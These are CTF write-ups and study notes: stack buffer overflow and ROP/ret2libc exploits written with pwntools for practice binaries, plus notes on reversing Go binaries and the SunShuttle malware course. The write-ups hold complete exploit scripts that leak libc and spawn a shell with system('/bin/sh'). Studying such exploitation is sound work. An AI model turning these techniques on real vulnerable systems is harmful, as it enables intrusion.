<p>For this challenge we will heavily rely on pwntools, python and gdb, although the challenge is pretty simple (took me 5 mins to solve) i think it's pretty educative on how to rop properly.</p>
<h2 id="solving-the-challenge-3"><a class="header" href="#solving-the-challenge-3">Solving the Challenge</a></h2>
<p>Looking at the <a href="https://ropemporium.com/challenge/split.html">ROPEmporium Website</a> we are given the following instructions.</p>
<pre><code>Still here

I'll let you in on a secret: that useful string &quot;/bin/cat flag.txt&quot; is still present in this binary, as is a call to system(). It's just a case of finding them and chaining them together to make the magic happen. 
</code></pre>
<p>We know there is the string &quot;/bin/cat flag.txt&quot; in the binary, and we can easily make a system call since the function is present in the binary.</p>
<pre><code class="language-py">import pwn

pwn.context.arch = &quot;amd64&quot;
e = pwn.ELF(&quot;./split&quot;)

def find_eip(payload):
    io = pwn.process(e.path)
    io.sendlineafter(b&quot;&gt; &quot;, payload)
    io.wait()
    rip_offset = pwn.cyclic_find(io.corefile.read(io.corefile.rsp, 4))
    pwn.log.info(&quot;Located RIP offset at {a}&quot;.format(a=rip_offset))
    return rip_offset

pop_rdi_ret = pwn.p64(0x4007c3)
offset = find_eip(pwn.cyclic(100))
io = pwn.process(e.path)
rop = pwn.ROP(e)
rop.system(e.symbols.usefulString)

payload = [
    b&quot;A&quot;*offset,
    rop.chain(),
    pop_rdi_ret
]

io.sendlineafter(b&quot;&gt; &quot;, b&quot;&quot;.join(payload))
io.interactive()
</code></pre>
<p>Running the following script should automatically find the crash offset and it will call system(&quot;/bin/cat flag.txt&quot;).</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="nahamcon-2021---ret2basic"><a class="header" href="#nahamcon-2021---ret2basic">NahamCon 2021 - Ret2Basic</a></h1>
<p>Ret2Basic was an overly simple challenge in which we have to overflow a buffer and overwrite the return address with the address at win function.</p>
<p>For this reason this writeup will be extremely quick and non detailed.</p>
<h2 id="finding-the-vulnerability"><a class="header" href="#finding-the-vulnerability">Finding the vulnerability</a></h2>
<p>Finding the vulnerability can be done without any decompiler / disassembler, since there is only a single input which is vulnerable.</p>
<p>Sending a lot of bytes into that input cause a segmentation fault.</p>
<p>Opening the binary inside gdb and running it with a cyclic string shows us that we overwrite the return address of the vuln function after 120 bytes of input.</p>
<h2 id="exploiting-and-winning-the-challenge"><a class="header" href="#exploiting-and-winning-the-challenge">Exploiting and Winning the Challenge</a></h2>
<p>Now that we now that we need to input 120 bytes before our new return address, we can start writing our script.</p>
<p>I like to use the &quot;template&quot; utility from the python pwn module, so i ran the following command to have a script template.</p>
<pre><code>$ pwn template ./ret2basic &gt; exploit.py
</code></pre>
<p>Then we can write the exploit script as follows.</p>
<pre><code class="language-py">io = start()
e = ELF(&quot;./ret2basic&quot;)

CRASH = 120 * b&quot;A&quot;
WIN_FUNC = p64(e.sym.win)

PAYLOAD = [
	CRASH,
	WIN_FUNC
]

io.sendline(b&quot;&quot;.join(PAYLOAD))
</code></pre>
<p>You can put this little script right after the &quot;EXPLOIT GOES HERE&quot; and then finally run it, this will output the flag.</p>
<pre><code>$ ./exploit.py
...
...
...
flag{fake_flag_for_testing}
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="return-to-what"><a class="header" href="#return-to-what">return-to-what</a></h1>
<p>this challenge was quite cool to complete, although i completed it locally on my machine (Arch Linux 5.16.4-arch1-1) instead of the real target (a Ubuntu machine) although i will show at the end how to do this challenge on ubuntu using <code>libc-database</code>.</p>
<h2 id="checking-the-binary"><a class="header" href="#checking-the-binary">Checking the binary</a></h2>
<p>First things first, we want to check which linker/libraries are attached to this binary, to do so i will use the <code>ldd</code> command on our binary :</p>
<pre><code>$ ldd ./challenge/return-to-what
		linux-vdso.so.1 (0x00007fff53558000)
		libc.so.6 =&gt; /usr/lib/libc.so.6 (0x00007fe8db8f4000)
		/lib64/ld-linux-x86-64.so.2 =&gt; /usr/lib64/ld-linux-x86-64.so.2 (0x00007fe8dbb04000)
</code></pre>
<p>In the preceding output, you can see that the binary uses <code>/usr/lib/libc.so.6</code>. Next let's check for the protections on this binary.</p>
<pre><code>$ checksec --file challenge/return-to-what
[*] '/home/korenkovichski/Documents/CTF/DownunderCTF_2020/pwn/return-to-what/challenge/return-to-what'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
</code></pre>
<p>Luckily for us the binary has no PIE which will make our life a LOT easier for determining libc offsets, since offsets will stay the same every time we run the binary.</p>
<h2 id="finding-a-vulnerability-1"><a class="header" href="#finding-a-vulnerability-1">Finding a vulnerability</a></h2>
<p>Now it's time to find where this program is vulnerable, in this case i didn't need a disassembler to find the vulnerable part, i just tried a cyclic pattern and the program directly crashed.</p>
<pre><code>$ ./return-to-what &lt;&lt;&lt;$(cyclic 200)
Today, we'll have a lesson in returns.
Where would you like to return to?
[1]    23700 segmentation fault (core dumped)  ./return-to-what &lt;&lt;&lt; $(cyclic 200)
</code></pre>
<p>So i hopped in GDB and found the offset at which we overwrite the return address.</p>
<pre><code>pwndbg&gt; r &lt;&lt;&lt;$(cyclic 200)
pwndbg&gt; cyclic -l 0x6161616f
56
</code></pre>
<p>We know we need a padding of 56 bytes before we can start overwriting the return address and therefore gaining control of the program.</p>
<h2 id="leak-a-function-from-got-table"><a class="header" href="#leak-a-function-from-got-table">Leak a function from .got table</a></h2>
<p>Now we need a leak, since the challenge doesn't provide any libc files, our binary is using the default libc library at <code>/usr/lib/libc.so.6</code>, since it's the default library on my OS it is quite complete and contains the <code>puts</code> function which is the easiest one to use when trying to leak addresses, we will leak the <code>puts</code> function in the <code>.got table</code> and call <code>puts</code> through the <code>procedure linkage table</code>.</p>
<pre><code class="language-py">from pwn import *

e = ELF(&quot;./challenge/return-to-what&quot;, checksec=False)
libc = ELF(&quot;/usr/lib/libc.so.6&quot;, checksec=False)

io = process(e.path)

context.binary = e
context.terminal = [&quot;konsole&quot;, &quot;-e&quot;]

PADDING_BEFORE_RETADDR = 56

rop = ROP(e)
POP_RDI_RET = rop.find_gadget([&quot;pop rdi&quot;, &quot;ret&quot;])[0]


PAYLOAD = [
	PADDING_BEFORE_RETADDR * b&quot;A&quot;,
	p64(POP_RDI_RET),
	p64(e.got.puts),
	p64(e.plt.puts)
]

io.sendline(b&quot;&quot;.join(PAYLOAD))

io.recvline()
io.recvline()
leak = u64(io.recvline().strip().ljust(8, b&quot;\x00&quot;))
info(f&quot;puts leak : {hex(leak)}&quot;)
io.interactive()
</code></pre>
<p>Running the script, proof that indeed we were able to leak the address of <code>puts</code> in the <code>global offset table</code>.</p>
<pre><code class="language-bash">$ python3 leak.py
[+] Starting local process '/home/korenkovichski/Documents/CTF/DownunderCTF_2020/pwn/return-to-what/challenge/return-to-what': pid 24257
[*] Loaded 14 cached gadgets for './challenge/return-to-what'
[*] puts leak : 0x7f9664a92ab0
[*] Switching to interactive mode
[*] Got EOF while reading in interactive
</code></pre>
<h2 id="calculate-libc-address-using-leak"><a class="header" href="#calculate-libc-address-using-leak">Calculate libc address using leak</a></h2>
<p>Our goal in this challenge is to end up calling <code>system(&quot;/bin/sh&quot;)</code> which will spawn us a shell, but manually calling system through an exploit is impossible if you don't know the actual address of system in memory.</p>
<p>We're a bit lucky here, PIE was disabled and therefore address will stay the same most of the time.</p>
<p>So time to calculate that offset, to do that we just need a simple substraction <code>&quot;(current address of puts - it's offset in libc)&quot;</code>, this simple operation should result in the base address of libc. We can add the following code to our script.</p>
<pre><code class="language-py">info(f&quot;offset of puts in libc : {hex(libc.symbols[&quot;puts&quot;])}&quot;)
libc.address = leak - libc.symbols[&quot;puts&quot;]
info(f&quot;base address of libc : {hex(libc.address)}&quot;)
</code></pre>
<p>Now if we run the script again we can see the base address of libc was leaked properly !</p>
<pre><code class="language-sh">python3 leak.py
[+] Starting local process '/home/korenkovichski/Documents/CTF/DownunderCTF_2020/pwn/return-to-what/challenge/return-to-what': pid 24399
[*] Loaded 14 cached gadgets for './challenge/return-to-what'
[*] puts leak : 0x7f123607aab0
[*] offset of puts in libc : 0x76ab0
[*] base address of libc : 0x7f1236004000
[*] Switching to interactive mode
[*] Got EOF while reading in interactive
$
</code></pre>
<p>The outputs makes a lot of sense, libc address tend to end with a bunch of zeros.</p>
<h2 id="catch-shell"><a class="header" href="#catch-shell">Catch Shell</a></h2>
<p>Funniest part, time to catch shells... hehe. Now to make the exploit simpler, we will call the main function once again and therefore we will hit the vulnerable part of our program a second time where we will input another buffer overflow payload, but this time since we know the base address of libc we can just call <code>system(&quot;/bin/sh&quot;)</code>.</p>
<p>Here is the final exploit that i used to exploit and win this challenge.</p>
<pre><code class="language-py">from pwn import *

e = ELF(&quot;./challenge/return-to-what&quot;, checksec=False)
libc = ELF(&quot;/usr/lib/libc.so.6&quot;, checksec=False)

io = process(e.path)

context.binary = e
context.terminal = [&quot;konsole&quot;, &quot;-e&quot;]

PADDING_BEFORE_RETADDR = 56

rop = ROP(e)
POP_RDI_RET = rop.find_gadget([&quot;pop rdi&quot;, &quot;ret&quot;])[0]


PAYLOAD = [
	PADDING_BEFORE_RETADDR * b&quot;A&quot;,
	p64(POP_RDI_RET),
	p64(e.got.puts),
	p64(e.plt.puts),
	p64(e.sym.main)  # note this change
]

io.sendline(b&quot;&quot;.join(PAYLOAD))

io.recvline()
io.recvline()
leak = u64(io.recvline().strip().ljust(8, b&quot;\x00&quot;))
info(f&quot;puts leak : {hex(leak)}&quot;)

info(f&quot;offset of puts in libc : {hex(libc.symbols[&quot;puts&quot;])}&quot;)
libc.address = leak - libc.symbols[&quot;puts&quot;]
info(f&quot;base address of libc : {hex(libc.address)}&quot;)

SECOND_PAYLOAD = [
	b&quot;A&quot;*56,
	POP_RDI_RET,
	p64(next(libc.search(b&quot;/bin/sh&quot;))),
	p64(libc.sym[&quot;system&quot;])
]

io.sendline(b&quot;&quot;.join(SECOND_PAYLOAD))

io.interactive()
</code></pre>
<p>Running the preceding code locally with the right libc path should usually result in you obtaining a shell, however when the challenge is being ran on a remote ubuntu machine, we do not have access to the library.</p>
<h2 id="finding-the-right-library"><a class="header" href="#finding-the-right-library">Finding the right library</a></h2>
<p>Our binary is running on a remote system, ready to be pwned hehe. But we have a problem, we don't know what are the offsets in libc. What you can do is instead of leaking puts, you can leak other functions too in the .got table, then head up at https://libc.rip and search those offsets together, this shoud output you the correct libc version that you need to pwn.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="stack-one-arm"><a class="header" href="#stack-one-arm">Stack-One (ARM)</a></h1>
<p>So i previously did all the challenges from <a href="https://exploit.education">exploit.education</a>, so i decided to switch to the ARM64 and ARM32 version of these challenges.</p>
<h2 id="analysing-the-challenge"><a class="header" href="#analysing-the-challenge">Analysing the Challenge</a></h2>
<p>So before getting into exploitation it's always a good idea to analyze the binary that we're about to exploit.</p>
<pre><code>$ checksec --file ./stack-zero
[*] '/opt/phoenix/arm64/stack-zero'
    Arch:     aarch64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
    RPATH:    b'/opt/phoenix/aarch64-linux-musl/lib'
	
$ file stack-zero
stack-zero: setuid, setgid ELF 64-bit LSB executable, ARM aarch64, version 1 (SYSV), dynamically linked, interpreter /opt/phoenix/aarch64-linux-musl/lib/ld-musl-aarch64.so.1, not stripped

$ readelf -h ./stack-zero
ELF Header:
  Magic:   7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00
  Class:                             ELF64
  Data:                              2's complement, little endian
  Version:                           1 (current)
  OS/ABI:                            UNIX - System V
  ABI Version:                       0
  Type:                              EXEC (Executable file)
  Machine:                           AArch64
  Version:                           0x1
  Entry point address:               0x400590
  Start of program headers:          64 (bytes into file)
  Start of section headers:          5296 (bytes into file)
  Flags:                             0x0
  Size of this header:               64 (bytes)
  Size of program headers:           56 (bytes)
  Number of program headers:         6
  Size of section headers:           64 (bytes)
  Number of section headers:         23
  Section header string table index: 20
  
$ readelf -p .shstrtab ./stack-zero
String dump of section '.shstrtab':
  [     1]  .symtab
  [     9]  .strtab
  [    11]  .shstrtab
  [    1b]  .interp
  [    23]  .hash
  [    29]  .dynsym
  [    31]  .dynstr
  [    39]  .rela.plt
  [    43]  .init
  [    49]  .text
  [    4f]  .fini
  [    55]  .rodata
  [    5d]  .eh_frame
  [    67]  .init_array
  [    73]  .fini_array
  [    7f]  .dynamic
  [    88]  .got
  [    8d]  .got.plt
  [    96]  .data
  [    9c]  .bss
  [    a1]  .comment

$ readelf -p .rodata ./stack-zero
String dump of section '.rodata':
  [     2]  @
  [     a]  @
  [    30]  Welcome to phoenix/stack-zero, brought to you by https://exploit.education
  [    80]  Well done, the 'changeme' variable has been changed!
  [    b8]  Uh oh, 'changeme' has not yet been changed. Would you like to try again?
</code></pre>
<h4 id="things-we-can-notice-on-the-analysis"><a class="header" href="#things-we-can-notice-on-the-analysis">Things we can notice on the analysis</a></h4>
<p>Looking at the output of our small analysis there is a couple of things to note.</p>
<ul>
<li>Binary is an ARM64 (AArch64) binary for 64 bit architecture and was dynamically linked.</li>
<li>All the protections are disabled for the program, the stack is writable, readable, and executable, which means we can write shellcode on the stack and the program will execute it.</li>
<li>Entry point of the program is at <code>0x400590</code>.</li>
<li>The program wants us to overwrite a variable on the stack.</li>
<li>The file was linked with <code>/opt/phoenix/aarch64-linux-musl/lib/ld-musl-aarch64.so.1</code>.</li>
</ul>
<h2 id="approaching-the-challenge"><a class="header" href="#approaching-the-challenge">Approaching the Challenge</a></h2>
<p>Now that we know basics stuff about, it's time to approach and win this challenge, let's disassemble the main function with gdb. Note that since the challenge is expecting us to overwrite something on the stack,  I know that the program will eventually make a comparison to check if a stack value is still the same, this comparison instruction can be found at <code>main+44</code>.</p>
<pre><code class="language-x86asm">pwndbg&gt; disass main
Dump of assembler code for function main:
   0x00000000004006c4 &lt;+0&gt;:     stp     x29, x30, [sp, #-112]!
   0x00000000004006c8 &lt;+4&gt;:     mov     x29, sp
   0x00000000004006cc &lt;+8&gt;:     str     w0, [x29, #28]
   0x00000000004006d0 &lt;+12&gt;:    str     x1, [x29, #16]
   0x00000000004006d4 &lt;+16&gt;:    adrp    x0, 0x400000
   0x00000000004006d8 &lt;+20&gt;:    add     x0, x0, #0x760
   0x00000000004006dc &lt;+24&gt;:    bl      0x400540 &lt;puts@plt&gt;
   0x00000000004006e0 &lt;+28&gt;:    str     wzr, [x29, #104]
   0x00000000004006e4 &lt;+32&gt;:    add     x0, x29, #0x28
   0x00000000004006e8 &lt;+36&gt;:    bl      0x400530 &lt;gets@plt&gt;
   0x00000000004006ec &lt;+40&gt;:    ldr     w0, [x29, #104]
   0x00000000004006f0 &lt;+44&gt;:    cmp     w0, #0x0
   0x00000000004006f4 &lt;+48&gt;:    b.eq    0x400708 &lt;main+68&gt;  // b.none
   0x00000000004006f8 &lt;+52&gt;:    adrp    x0, 0x400000
   0x00000000004006fc &lt;+56&gt;:    add     x0, x0, #0x7b0
   0x0000000000400700 &lt;+60&gt;:    bl      0x400540 &lt;puts@plt&gt;
   0x0000000000400704 &lt;+64&gt;:    b       0x400714 &lt;main+80&gt;
   0x0000000000400708 &lt;+68&gt;:    adrp    x0, 0x400000
   0x000000000040070c &lt;+72&gt;:    add     x0, x0, #0x7e8
   0x0000000000400710 &lt;+76&gt;:    bl      0x400540 &lt;puts@plt&gt;
   0x0000000000400714 &lt;+80&gt;:    mov     w0, #0x0                   // #0
   0x0000000000400718 &lt;+84&gt;:    bl      0x400560 &lt;exit@plt&gt;
End of assembler dump.
</code></pre>
<p>Before the comparison we see that the program move the value <code>[x29+104]</code> inside <code>w0</code>, then we check if this value on the stack has changed (different than 0).</p>
<p>So logically we can input a cyclic pattern to our program and check where exactly we overwrite the value on the stack.</p>
<pre><code>pwndbg&gt; b *main+44
pwndbg&gt; r &lt;&lt;&lt;$(cyclic 200)
pwndbg&gt; x/s $w0
0x61616171:     &lt;error: Cannot access memory at address 0x61616171&gt;
pwndbg&gt; cyclic -l 0x61616171
64
</code></pre>
<p>We can see that after 64 bytes of input we start overwriting the variable, this can be proved by inputting a 64 bytes cyclic pattern and a 65 bytes cyclic pattern and observing the outputs.</p>
<pre><code>$ ./stack-zero &lt;&lt;&lt;$(cyclic 64)
Welcome to phoenix/stack-zero, brought to you by https://exploit.education
Uh oh, 'changeme' has not yet been changed. Would you like to try again?

$ ./stack-zero &lt;&lt;&lt;$(cyclic 65)
Welcome to phoenix/stack-zero, brought to you by https://exploit.education
Well done, the 'changeme' variable has been changed!
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="anatomy-of-a-gopher"><a class="header" href="#anatomy-of-a-gopher">Anatomy of a Gopher</a></h1>
<p>This sections are my notes relating the SANS talk &quot;Anatomy of a Gopher&quot;, by hex0punk (Alex Useche). The talk is still available on youtube at the following link <a href="%22https://www.youtube.com/watch?v=wWNbnEp_4ZE%22">talk</a>.</p>
<h2 id="what-are-we-doing"><a class="header" href="#what-are-we-doing">What are we doing</a></h2>
<ul>
<li>Learning about what makes go binaries different than C and C++ binaries.</li>
<li>Identifying techniques for recognizing and conducting analysis of go binaries.</li>
<li>Tips for finding vulnerabilities in go binaries.</li>
<li>Identifying common patterns found in go binaries.</li>
<li>Learning about protections that can be added to go binaries.</li>
</ul>
<h2 id="the-go-assembler"><a class="header" href="#the-go-assembler">The GO Assembler</a></h2>
<ul>
<li>The go compiler is based on plan9 compiler.</li>
<li>Semi-abstract instruction set.</li>
<li>Pseudo-Assembly.</li>
<li>Not a direct representation of the underlying machine (i.e MOV may be a LD)</li>
<li>It also introduces a set of pseudo registers (that you might not have seen before).</li>
</ul>
<h2 id="tools"><a class="header" href="#tools">Tools</a></h2>
<ul>
<li><strong>Go Tool Objdump</strong>
You can use <strong>objdump</strong> along with <strong>go tool</strong> to dump binary informations (functions, sections,...) </li>
</ul>
<p>You would typically use it the following way.</p>
<pre><code>$ go tool objdump -s &lt;func&gt; &lt;bin&gt; 
$ go tool objdump &lt;arguments&gt; &lt;bin&gt;
</code></pre>
<p>A big advantage of using <strong>go tool objdump</strong> is that you get line numbers in code.This can help you group instructions by operations.</p>
<p><em>Note that pretty much every disassembler does a great job at disassembling go binaries, this includes (r2, ghidra, ida, cutter, binary ninja, hopper, gdb,...).</em></p>
<p><em>Usually it is a best practice to use as many disassembler as you can and compare and catch on differences in the output, i usually like ghidra + ida or ida + binary ninja</em></p>
<h2 id="default-protections-on-go-binaries"><a class="header" href="#default-protections-on-go-binaries">Default Protections on Go Binaries</a></h2>
<p>When you run go build, it should enable <strong>NX</strong> <em>(or No Execute if you prefer)</em> by default on the resulting binary. </p>
<p>However note that <strong>Position Independent Code (PIC or PIE) and Stack Canaries</strong> are usually disabled <strong>by default</strong>, also note that binaries are not stripped.</p>
<p>ROP are a lot easier on go binaries since <strong>PIC (or PIE)</strong> is disabled by default.</p>
<h4 id="how-to-enable-protections-on-go-binaries"><a class="header" href="#how-to-enable-protections-on-go-binaries">How to enable protections on Go binaries.</a></h4>
<ul>
<li>Enable Stack Protections <code>export CGO_LDFLAGS='-fstack-protector'</code></li>
<li>Strip the binary <code>GOOS=linux go build -ldflags=&quot;-s -w&quot;</code></li>
<li>Enable PIE <code>export GOFLAGS='-buildmode=pie'</code></li>
<li>Strip functions names and reduce size <code>Get UPX and pack the file</code></li>
</ul>
<h2 id="searching-for-strings"><a class="header" href="#searching-for-strings">Searching for Strings</a></h2>
<p>Searching for strings in a go binary is a little harder than usual, because they are clumped together in a massive string table.</p>
<ul>
<li>Go does not store null terminated strings.</li>
<li>Strings are clumped together, while keeping a separate table with length information.</li>
<li>This can make it difficult to look for string cross-references.</li>
<li>We can use a project like <a href="https://github.com/carvesystems/gostringsr2">gostringsr2</a> to parse strings.</li>
<li>When working with MachO binaries, you'd have to list strings from .rodata or entire binary</li>
</ul>
<p>The usage of <strong>grep</strong> or filters is basically a must when looking at a go binary strings, because finding yourself in this massive string table can be quite hard.</p>
<p><strong>rabin2</strong>
rabin2 is very useful when looking at go strings and is absolutely straightforward to use.</p>
<pre><code>rabin2 -zz &lt;binary&gt; | grep &lt;char.sequence&gt;
</code></pre>
<p><em>Just like with disassemblers, always use 2-3 different program when looking at strings and check for any differences, it might be hard to see with go binaries since they are statically linked, therefore all library strings should also be in the string table by default.</em></p>
<h2 id="searching-for-functions"><a class="header" href="#searching-for-functions">Searching for functions</a></h2>
<p>Searching for functions is a lot easier than searching for strings in go binaries, which is the opposite of usual C/C++ binaries where strings are by default easier to find than functions.</p>
<p>Most of the time, even <strong>stripped</strong>, functions are still easy to find in go binaries, which is awesome to us anal-ysts.</p>
<h2 id="finding-the-main-function"><a class="header" href="#finding-the-main-function">Finding the main function</a></h2>
<p>Finding the main function is the easiest to find in go binaries, even in stripped ones... to find the main function look for either <strong>main.main or main_main</strong>.</p>
<h2 id="go-stacks"><a class="header" href="#go-stacks">Go Stacks</a></h2>
<p>An important thing to know about Go binaries is that they handle stacks differently, here's the main difference.</p>
<ul>
<li>Go routines have small stacks by default (2 kibibyte = 1024 bytes stack)</li>
<li>Many goroutines will call <strong>morestack</strong> (sym.runtime.morestack_noctxt), to grow the stack (in powers of 2) as needed using stack copying.</li>
<li>This is called because go can't be sure the function will outgrow the stack (i.e recursive functions) given non-deterministic goroutines.</li>
<li>When this occurs, stack grows, pointers in the stack are updated.</li>
<li>Additionally, each function compares its stack pointer against <strong>g-&gt;stackguard</strong> to check for overflow.</li>
<li>Go uses 8 byte alignment on stack.</li>
</ul>
<h2 id="conventions-arguments-and-return-values"><a class="header" href="#conventions-arguments-and-return-values">Conventions (Arguments and Return Values)</a></h2>
<p>Go binaries places return values on the stack, as opposed to C where return values are placed in registers (usually eax for x86).</p>
<p>As for return values, function arguments are also placed on the stack rather than registers.</p>
<p><em>Understanding go internal libraries can significantly help us understand what is going on in the assembly code. Read the Go Docs !</em></p>
<h2 id="go-error-handling"><a class="header" href="#go-error-handling">Go Error Handling</a></h2>
<ul>
<li><strong>error</strong> is an interface.</li>
<li>Error handling is clumsy in go.</li>
<li>Bugs due to unhandled errors are common.</li>
<li>When checking for <strong>error != nil</strong> we load the error vtable and error value.</li>
<li>Then we test if the value is nil.</li>
<li>And branch depending on the result.</li>
</ul>
<h2 id="reversing-in-action-golang-malware-used-in-the-solarwinds-attack-kaspersky"><a class="header" href="#reversing-in-action-golang-malware-used-in-the-solarwinds-attack-kaspersky">Reversing in action: Golang malware used in the SolarWinds attack (Kaspersky)</a></h2>
<p>From now on, the notes are not related to the <strong>Anatomy of Go video</strong>, but on this <a href="https://www.youtube.com/watch?v=_cL-OwU9pFQ">Kaspersky course</a>. I highly recommend that you go watch the video too.</p>
<p>This course is an absolute pearl and helped me a lot learn more about Go and Reverse Engineering, we focus principally on reversing a piece of malware that was used in the SolarWinds breach a little earlier this year, the malware in question is <strong>SunShuttle</strong>.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="reversing-in-action-golang-malware-used-in-the-solarwinds-attack-kaspersky-1"><a class="header" href="#reversing-in-action-golang-malware-used-in-the-solarwinds-attack-kaspersky-1">Reversing in action: Golang malware used in the SolarWinds attack (Kaspersky)</a></h1>
<p>This course is a must if your going to reverse go malware, it takes a very deep approach in the analysis of a malware named <strong>SunShuttle</strong>, it was notably used as a fully featured backdoored in the <strong>SolarWinds Breach Indicent</strong>, which was one of the biggest breach in the history of hacking.</p>
<h2 id="introduction"><a class="header" href="#introduction">Introduction</a></h2>
<p><strong>What you will learn</strong> :</p>
<pre><code>- How to reverse-engineer Go Malware
- Fundamentals of the Go Language
</code></pre>
<p><strong>Why it is important ? :</strong></p>
<pre><code>- Go is increasingly being used among malware authors
- Go binaries cannot be tackled with the usual approach
</code></pre>
<p><strong>In Context :</strong> <a href="https://securelist.com/sunburst-backdoor-kazuar">Sunburst Backdoor Kazuar</a></p>
<p>If you haven't did already, go see my notes on <a href="https://exploitation.reversing-ninja.com/anatomy-of-a-gopher.html">Anatomy of a Gopher</a> they might greatly help for this course and also don't forget to go watch the SANS talk by hex0punk about Go Reverse Engineer (link in Anatomy of a Gopher notes).</p>
<p><strong>Things to notes about Go before starting to reverse :</strong></p>
<pre><code>- Generates statically-built executables, this makes the program weigh a LOT more than usual dynamically programs, a simple **Hello World** program can weigh up to **2 Megabytes** that is huge !
- Go does not enable PIC or PIE (Position Independent Code or Executable).
- Go does not stripped binaries by default.
- Go does not enable any stack protections (stack canaries).
- Searching for strings in a Go binary can't be quite a pain in the ass.
- Searching for functions is easier than searching for strings, since functions name aren't stripped.
- Go stacks are really small by default (2 kibibytes or 1024 bytes of stack), therefore many goroutines will call **morestack** (sym.runtime.morestack\_noctxt), to grow the stack size (in powers of 2) as needed using **stack copying**.
</code></pre>
<p>a    - Go uses 8 bytes alignment on the stack.
- Each functions compare it's stack pointer agains't <strong>g-&gt;stackguard</strong> to check for overflow.
- Go binaries can return multiple values, therefore it places all the return values on the stack, because 3 return values would not fit inside rax.
- Decompiling go binaries won't be very useful as it doesn't make the code more readable in a C representation.</p>
<h2 id="practice-reverse-engineering-small-go-programs"><a class="header" href="#practice-reverse-engineering-small-go-programs">Practice Reverse Engineering Small Go Programs</a></h2>
<p>Let's take an example, we will write a small Go program, compile it without optimizations and look at the assembly of it, we will write this small program :</p>
<pre><code class="language-go">package main
import (
    &quot;fmt&quot;
)

// Compiled with disabled optimizations (-gcflags '-N -l')

func main(){
    res := sum(1, 10, 100)
    fmt.Println(&quot;Result = &quot;, res)
}

func sum(a, b, c int) (int){
    return a + b + c
}
</code></pre>
<p><strong>Compile this and open it in IDA or your preferred disassembler and let's start doing some reversing :</strong></p>
<p>First thing to note is that we don't have the usual function prologue</p>
<pre><code class="language-x86asm">    push rbp; 
    mov rbp, rsp
</code></pre>
<p>Instead functions start by checking if the stack is big enough as you can see in the following code</p>
<pre><code class="language-x86asm">    mov rcx, gs:28h; 
    mov rcx, [rcx+0]; 
    lea rax, [rsp+var_8]; 
    cmp rax, [rcx+10h]; 
    jbe address
</code></pre>
<p>In this code we check if the argument at [rsp+var_8] is below the address of <strong>rcx</strong>, which should be something like the stack size or address or offset, i am not sure on this one.</p>
<p>If we were below <strong>rcx</strong> or equal to it, we jump to <strong>sym.runtime.morestack_noctxt</strong>, which as said previously will double the stack size using <strong>stack copying</strong>.</p>
<p>Since this code is usually present at the beginning of every function, you can just ignore it (you can change it's color to black in IDA or what i like to do is right click on the block of code i want to hide and click group node, input a text that represent the block code and confirm).</p>
<p>You should end up with something that look like this if you did my way :</p>
<p><img src="https://i.imgur.com/XMz2wFR.png" alt="Nodes Grouped" /></p>
<p>You can see that i highlighted some stuff, first i highlighted the arguments of the <strong>main_sum</strong> function call, these arguments are <strong>1, 10, 100</strong> respectivily which are the exact same values we passed to main.sum the main function in our source (<strong>sum(1, 10, 100)</strong>).</p>
<p>Secundo i highlighted the function <strong>main_sum</strong> in green, and for those who haven't noticed i have explicitely written where the main code block is, although i assume you would have been able to find it yourself.</p>
<p>Okay now have you already forgotten that Go return values on the stack instead of rax ? hopefully not, let's prove this :</p>
<pre><code class="language-x86asm">mov     [esp+0x40+var_40], 1   
mov     [esp+0x40+var_3C], 0xA
mov     [esp+0x40+var_38], 0x64
call    main_sum
mov     eax, [esp+0x40+var_34]
mov     [esp+0x40+var_28], eax
</code></pre>
<p>We first prepare for the <strong>main_sum</strong> function and put every argument on the stack, each of those arguments takes <strong>4 bytes in size</strong> (we know we are dealing with integers), also note that the arguments are put backward on the stack. We then call our functions main, and return. Our return value has been placed <strong>4 bytes below our first argument (0x64 located at [esp+0x40+var_38])</strong>, our return value is only 4 bytes in size since we have implicitly declared it to be a int in our source code.</p>
<p>One nice thing Ivan teached me is that arguments will be interpreted as variables in the disassembly, you can press <strong>q</strong> on them and it will change them and make them look more like <strong>stack offsets</strong>, renaming variables can be quite useless in any case since variables are used to do very different things throughout the lifetime of the function.
<img src="https://thumbs.gfycat.com/SmoothAmusingGrouper-mobile.mp4" alt="Removing Variables" /></p>
<p>One last thing is the fmt_Printf printf function which we haven't seen yet, it a little bit further in the assembly
<img src="https://i.imgur.com/IWygaIL.png" alt="fmt_Println" /></p>
<p><strong>Let's write a little more complex go program and let's reverse it :</strong>
This time we will use multiple return values with a mini error handling mechanism, the code is going to be once again really easy to read and understand</p>
<pre><code class="language-go">package main
import(
    &quot;fmt&quot;
    &quot;errors&quot;
)

func main(){
    res, s, err := sum(1, 10, 100)
    if err == nil {
        fmt.Println(&quot;Result = &quot;, res, s)
    }
}

func sum(a, b, c int) (int, string, error){
    return a + b + c, &quot;REMA2&quot;, errors.New(&quot;Fake Error&quot;)
}
</code></pre>
<p>Compile the code with the same flags we used earlier (<strong>go build -gcflags &quot;all=-N -l&quot; program.go -o program.exe</strong>), and let's reverse it !</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="license-checker-0x01"><a class="header" href="#license-checker-0x01">License Checker 0x01</a></h1>
<p>One of the easiest RE Challenges i've ever done, we will really really really quickly do this challenge in a blog post.</p>
<h2 id="first-run"><a class="header" href="#first-run">First Run</a></h2>
<p>We run our program a first time to know how it works, the program seems to expect us to enter a license key as an argument <code>./license_checker_1 AAAA-AAAA-AAAA</code>.</p>
<h2 id="disassembling-the-binary"><a class="header" href="#disassembling-the-binary">Disassembling the binary</a></h2>
